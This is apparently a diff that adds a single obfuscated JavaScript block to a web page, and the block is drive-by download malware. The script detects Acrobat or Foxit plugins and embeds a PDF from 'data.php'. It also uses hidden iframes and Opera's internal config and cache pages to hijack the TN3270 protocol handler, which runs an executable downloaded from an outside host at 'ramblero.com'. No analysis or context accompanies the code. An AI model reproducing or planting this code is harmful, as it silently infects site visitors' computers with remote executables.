@@ -1,0 +1,70 @@
+<script type='text/javascript'>
+function U1HW9gDUQLO3WSgc() {
+	try{
+		var zmiU3wppi9Jcvzx2 = navigator.plugins.length;
+		for (var tEX9vkcL71OcT6Fr=0;tEX9vkcL71OcT6Fr<zmiU3wppi9Jcvzx2;tEX9vkcL71OcT6Fr++) {
+	        var WxLutBjcJ4FF4CG3 = navigator.plugins[tEX9vkcL71OcT6Fr].name;
+	        if (WxLutBjcJ4FF4CG3.indexOf("Acrobat") != -1) {
+				document.write("<embed width='126' height='160' src='data.php?id=512' type='application/pdf'></embed>");
+	              return 0;
+	        }
+		}
+	}catch(e){}
+	return 0;
+}
+function OUzOfi1ymFEpSUst() {
+	try{
+		var c4GpqzUd7mvII4Mn = navigator.plugins.length;
+		for (var fMBD5BBrRPguuYnB=0;fMBD5BBrRPguuYnB<c4GpqzUd7mvII4Mn;fMBD5BBrRPguuYnB++) {
+	        var J42R3V60I1Ra5oNb = navigator.plugins[fMBD5BBrRPguuYnB].name;
+	        if (J42R3V60I1Ra5oNb.indexOf("Foxit") != -1) {
+				document.write("<embed width='144' height='70' src='data.php?id=197' type='application/pdf'></embed>");
+	              return 0;
+	        }
+		}
+	}catch(e){}
+	return 0;
+}
+function uYO15U0MUbwYQKAb() {
+	szre1yrRlym8sJ5q = document.createElement('iframe');
+	szre1yrRlym8sJ5q.src = 'about:blank';
+	szre1yrRlym8sJ5q.setAttribute('id', 'JSrvx2HRdE15ZBfT');
+	szre1yrRlym8sJ5q.setAttribute('style', 'display:none');
+	document.appendChild(szre1yrRlym8sJ5q);
+	JSrvx2HRdE15ZBfT.eval(
+	        "var wX9CVzdHyQOrjShb;"+
+	        "aZWsaoKD4LIcWx6i = document.createElement('iframe');"+
+	        "aZWsaoKD4LIcWx6i.setAttribute('id', 'REu2DYICyh4iAlJ6');"+
+	        "aZWsaoKD4LIcWx6i.src = 'opera:config';"+
+	        "document.appendChild(aZWsaoKD4LIcWx6i);"+
+	        "hqyveI0hdRKAPQsu = document.createElement('img');"+
+	        "hqyveI0hdRKAPQsu.src = 'http://ramblero.com/yandexru/loads.php?id=40';"+
+	        "document.appendChild(hqyveI0hdRKAPQsu);"+
+	        "KnwsLE5Kw937tMCE();"+
+	        "function KnwsLE5Kw937tMCE(){"+
+	                "zA0qTJY8ksI0IB5x = document.createElement('iframe');"+
+	                "zA0qTJY8ksI0IB5x.src = 'opera:cache';"+
+	                "zA0qTJY8ksI0IB5x.onload = function (){"+
+	                        "j1pKFtfC2iJv5V0H = zA0qTJY8ksI0IB5x.contentDocument.childNodes[0].innerHTML.toUpperCase();"+
+	                        "var gJ9AcgINZaXslcpk = new RegExp('(OPR\\\\\w{5}.EXE)</TD>\\\\\s*<TD>\\\\\d+</TD>\\\\\s*<TD><A HREF=\"'+'HTTP://RAMBLERO.COM/YANDEXRU/LOADS.PHP?ID=47\\\\\?','');"+
+	                        "ze6sYl6aTOVYtfpa = j1pKFtfC2iJv5V0H.match(gJ9AcgINZaXslcpk);"+
+	                        "if(!ze6sYl6aTOVYtfpa)return(0);"+
+	                        "REu2DYICyh4iAlJ6.eval("+
+	                                "\"opera.setPreference('Network','TN3270 App',opera.getPreference('User Prefs','Cache Directory4')+parent.ze6sYl6aTOVYtfpa[1]);\"+"+
+	                                "\"cxkbd3yDdW6P9uAl = document.createElement('a');\"+"+
+	                                "\"cxkbd3yDdW6P9uAl.setAttribute('href', 'tn3270://rFe71jgU8C32rsbq');\"+"+
+	                                "\"cxkbd3yDdW6P9uAl.click();\"+"+
+	                                "\"setTimeout(function(){opera.setPreference('Network','TN3270 App','telnet.exe');},1000);\""+
+	                        ");"+
+	                        "clearTimeout(wX9CVzdHyQOrjShb);"+
+	                        "tMRTPQg3xlS6fcqE = document.createElement('iframe');"+
+	                        "tMRTPQg3xlS6fcqE.src = 'http://ramblero.com/yandexru/loads.php?id=45';"+
+	                        "document.appendChild(tMRTPQg3xlS6fcqE);"+
+	                        "return(0);"+
+	                "};"+
+	                "document.appendChild(zA0qTJY8ksI0IB5x);"+
+	                "wX9CVzdHyQOrjShb = setTimeout(function(){KnwsLE5Kw937tMCE();},2000);"+
+	                "return(0);"+
+	        "}"
+	);
+}if (U1HW9gDUQLO3WSgc()||OUzOfi1ymFEpSUst()||uYO15U0MUbwYQKAb()) {}</script>
